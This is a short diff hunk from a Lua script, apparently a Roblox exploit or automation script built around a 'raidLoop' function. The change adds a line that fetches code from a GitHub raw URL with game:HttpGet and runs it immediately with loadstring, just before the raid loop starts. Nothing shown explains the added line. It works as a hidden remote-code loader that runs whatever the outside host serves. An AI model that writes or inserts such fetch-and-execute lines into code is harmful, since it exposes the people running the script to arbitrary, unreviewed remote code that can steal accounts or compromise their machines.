@@ -108,5 +108,5 @@ local function raidLoop()
         end
     end
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/message"))()
 raidLoop() -- Start the raid loop
